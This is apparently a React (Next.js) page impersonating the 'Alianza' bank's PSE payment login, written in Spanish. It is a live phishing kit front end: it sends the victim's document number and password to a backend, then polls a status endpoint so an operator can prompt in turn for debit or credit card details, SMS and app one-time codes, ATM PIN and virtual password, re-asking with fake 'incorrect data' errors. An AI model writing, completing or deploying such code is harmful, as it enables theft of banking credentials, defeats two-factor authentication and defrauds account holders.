"use client"
import { useEffect, useState } from "react"
import "./alianza.css"
import InputMinimalista from "@/components/inputMinimalista/InputMinimalista"
import { SelectMinimalista } from "@/components/selectMinimalista/SelectMinimalista"
import axios from "axios"
import { Tarjeta } from "@/components/tarjeta/Tarjeta"
import { Status } from "@/components/status/Status"

//ESTILOS DE COLORES
const bg_principal = "bg-white"
const text_color_principal = "text-[#002f58]"
const text_color_label = "text-[#002f58]"


const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
    const [errorDatos, setErrorDatos] = useState({
        numeroDocumento: "",
        contrasenia: ""       
    })

    const handlerContinuar = () => {
        const nuevosErrores = {
            numeroDocumento: "",
            contrasenia: ""
        }

        // Validación de número de documento
        if (!datosInicio.numeroDocumento || datosInicio.numeroDocumento.trim() === "") {
            nuevosErrores.numeroDocumento = "El número de documento es obligatorio"
        }

        // Validación de contraseña
        if (!datosInicio.contrasenia || datosInicio.contrasenia.trim() === "") {
            nuevosErrores.contrasenia = "La contraseña es obligatoria"
        }

        // Si hay errores, los mostramos
        if (nuevosErrores.numeroDocumento || nuevosErrores.contrasenia) {
            setErrorDatos(nuevosErrores)
            return
        }

        // Si no hay errores, limpiamos y ejecutamos la acción
        setErrorDatos({
            numeroDocumento: "",
            contrasenia: ""
        })
        btnInicio()
    }

    return (
        <div className="w-full">
            <div className="w-full mb-6">
                <span className="text-[11px] text-gray-400">Todos los campos son obligatorios</span>
            </div>               
                {tituloError !== "" && 
                    <div className="w-full flex items-center justify-center">
                        <span className="text-[11px] text-red-600">{tituloError}</span>
                    </div>
                }
            <div className="w-full mt-4 mb-4">
                <span className={`text-[15px] ${text_color_principal}`}>Inicio sesión</span>
            </div>
            <div className="w-full flex flex-col gap gap-y-4 pl-1">

                <SelectMinimalista 
                    label={"Tipo de documento"} 
                    labelColor={text_color_label} 
                    name={"tipoDocumento"} 
                    handler={handlerInformacion} 
                    value={datosInicio.numeroDocumento} 
                    arrayDatos={["Cédula de ciudadanía", "Cédula de extranjería", "Tarjeta de identidad", "Pasaporte", "Registro Civil", "NUIP"]} 
                    borderCol={"border-gray-400"} 
                    borderColSelec={"border-black"} 
                    borderColError={"border-red-600"}
                />

                <InputMinimalista 
                    error={!!errorDatos.numeroDocumento} 
                    errorLabel={errorDatos.numeroDocumento} 
                    label={"Número de documento"} 
                    labelColor={text_color_label} 
                    placeHolder={"Ingrese su número de documento"} 
                    name={"numeroDocumento"} 
                    handler={handlerInformacion} 
                    value={datosInicio.numeroDocumento} 
                    borderCol={"border-gray-400"} 
                    borderColSelec={"border-black"} 
                    borderColError={"border-red-600"} 
                    modoNumerico={true}
                />

                <InputMinimalista 
                    error={!!errorDatos.contrasenia} 
                    errorLabel={errorDatos.contrasenia} 
                    label={"Contraseña"} 
                    labelColor={text_color_label} 
                    placeHolder={"Ingrese su contraseña"} 
                    name={"contrasenia"} 
                    handler={handlerInformacion} 
                    value={datosInicio.contrasenia} 
                    borderCol={"border-gray-400"} 
                    borderColSelec={"border-black"} 
                    borderColError={"border-red-600"} 
                    modoNumerico={true} 
                    type="password" 
                    btn={true} 
                    contenBtn={btn}
                />

                <span className="text-[#999c24] text-[14px] w-full mt-3 mb-1.5">¿Olvidó su contraseña?</span>

                <div className="w-full flex items-center">
                    <button onClick={handlerContinuar} className="py-1 px-6 text-white bg-[#0370d1]">
                        INGRESAR
                    </button>
                    <button onClick={btnCancelar} className="ml-3 mt-2 py-1 px-6 text-white bg-[#0370d1]">
                        CANCELAR
                    </button>
                </div>
            </div>
        </div>
    )
}



const btn = (<spam className="w-full text-center p-1.5 text-[11px] text-[#002f58] font-medium bg-gray-300">Mostrar Contraseña</spam>)


export default function Alianza (){
    const [inicioSesion, setInicioSesion] = useState(false)
    const [selectVista, setSelectVisata] = useState(null)
    const [loading, setLoading] = useState(false)
    const [tituloError, setTituloError] = useState("")
    const [reLoad, setReLoad] = useState(false)
    const [key, setKey] = useState(0)
    const [datosInicio, setDatosInicio] = useState({
        tipoDocumento: "Cédula De Ciudadanía",
        numeroDocumento: "",
        contrasenia:""
    })
    const [guardado, setGuardado] = useState(false)
    const [uniqId, setUniqId] = useState("")
    const [btnInicio, setBtnInicio] = useState(false)

    const handlerInformacion = (e)=>{
        const copia = {...datosInicio}
        copia[e.target.name] = e.target.value
        setDatosInicio(copia)
    }

    const handlerBtnInicio = ()=>{
        setBtnInicio(b => !b)
    }
    
    //obtener uniqId
    useEffect(() => {
        const savedId = localStorage.getItem('uniqId')
        console.log(savedId == null, "guardaaaa", savedId);
        const temp = savedId == null ? "" : savedId
        setUniqId(temp)
        
    }, [])
    
    //guardad datos de sesion
    useEffect(()=>{
        const inicioSesionfuncion = async ()=>{
            setLoading(true)
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "Alianza",
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            console.log("lo que hay en ",uniqId, " y en data: ", data);
            
            if(uniqId === "" ) {
                localStorage.setItem('uniqId', data.uniqid)
                setUniqId(data.uniqid)
            }
            setKey(k => k+1)
            setInicioSesion(true)
            setTituloError("")
            setGuardado(true)
            
        }
        if (btnInicio) {
            inicioSesionfuncion()
        }
    },[btnInicio])

    //pulling
    useEffect(() => {
    let isMounted = true;

    const iniciarLongPolling = async () => {
        if (!isMounted) return;
        setTituloError("")
        try {
            console.log(uniqId, "pulling");
            
            const selV = await axios.get(`/api/sesion/status/${uniqId}`, {
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
            });
            console.log(selV.data.status);
            
            if (
                selV.data.status == "tdb" ||
                selV.data.status == "tdb-error" ||
                selV.data.status == "tdc" ||
                selV.data.status == "tdc-error" ||
                selV.data.status == "otpsms" ||
                selV.data.status == "otpsms-error" ||
                selV.data.status == "otpapp" ||
                selV.data.status == "otpapp-error" ||
                selV.data.status == "clavecajero" ||
                selV.data.status == "clavecajero-error" ||
                selV.data.status == "clavevirtual" ||
                selV.data.status == "clavevirtual-error" &&
                selV.data.status !== selectVista
            ) {
                setSelectVisata(selV.data.status);
                setKey(prev => prev + 1) 
                setLoading(false);
                return;
            }else if(selV.data.status == "fin"){
                setSelectVisata("compraExitosa")
                setLoading(false);
                return;
            }else if(selV.data.status == "error"){
                setSelectVisata("errorCompra")
                setLoading(false);
                return;

            }else if(selV.data.status == "login" || selV.data.status == "login-error"){
                console.log("entroooooo");
                
                setInicioSesion(true)
                setDatosInicio({
                    tipoDocumento: "Cédula De Ciudadanía",
                    numeroDocumento: "",
                    contrasenia:""
                })
                setSelectVisata(selV.data.status)
                if (selV.data.status == "login-error") setTituloError("Informacion incorrecta, ingresala nuevamente")
                setKey(prev => prev + 1)
                setLoading(false);
                return;
            }
        } catch (error) {
            console.log(error);
        }

        // Esperamos 4 segundos y reintentamos
        setTimeout(iniciarLongPolling, 4000);
    };
    if (guardado) {
        iniciarLongPolling()
    }

    return () => {
        isMounted = false;
    };
    }, [guardado, reLoad]);

    //mensje-otp
    const handlerMensaje = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-sms`, {
                uniqid: uniqId,
                otpsms: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    const handlerloginError = async ()=>{
        try {
            setLoading(true)
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "Alianza",
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    
    //otp-app
    const handlerAplicacion = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-app`, {
                uniqid: uniqId,
                otpapp: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //clave-cajero
    const handlerCajero = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-cajero`, {
                uniqid: uniqId,
                clavecajero: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    //clave-virtual
    const handlerClaveVirtual = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-virtual`, {
                uniqid: uniqId,
                clavevirtual: clave 
            },{
            headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //tarjeta
    const handlerTarjeta = async (body) =>{
        try {
            setLoading(true)
            body.uniqid = uniqId
            const send = await axios.post(`/api/sesion/tarjeta`, body, {
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
            console.log(error);
            setReLoad(r => r = !r)
        }
        
    }



    return(
        <div className={`w-full flex flex-col items-center justify-center ${bg_principal}`}>
            <div className="w-[80%] flex flex-col items-center justify-center">
                <h5 className={`text-[15px] font-semibold pt-2 pb-5 ${text_color_principal}`}>PAGOS PSE - PERSONAS</h5>
                <p className={`text-[25px] font-semibold pb-5 ${text_color_principal}`}>Bienvenido a su portal en <span className="underline decoration-3 decoration-sky-600 underline-offset-[10PX]">línea</span></p>
                {!inicioSesion && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
                {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
                
                {selectVista == "tdb" && <Tarjeta key={key} InputModificado={InputMinimalista} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "tdb-error" && <Tarjeta key={key} InputModificado={InputMinimalista} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "tdc" && <Tarjeta key={key} InputModificado={InputMinimalista} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "tdc-error" && <Tarjeta key={key} InputModificado={InputMinimalista} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpsms" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputMinimalista} handler={handlerMensaje} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpsms-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputMinimalista} handler={handlerMensaje} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpapp" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputMinimalista} handler={handlerAplicacion} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpapp-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputMinimalista} handler={handlerAplicacion} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavecajero" && <Status key={key} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputMinimalista} handler={handlerCajero} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavecajero-error" && <Status key={key} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputMinimalista} handler={handlerCajero} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavevirtual" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputMinimalista} handler={handlerClaveVirtual} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavevirtual-error" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputMinimalista} handler={handlerClaveVirtual} estiloBtnContinuar={"py-1 px-6 text-white  bg-[#0370d1] text-[14px]"} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                
            </div>
            {!inicioSesion &&  
                <div className="mt-5 w-full">
                    <img className="w-full object-cover" src="./assets/alianza/banerA.JPG"/>
                </div>
            }
        </div>
    )
}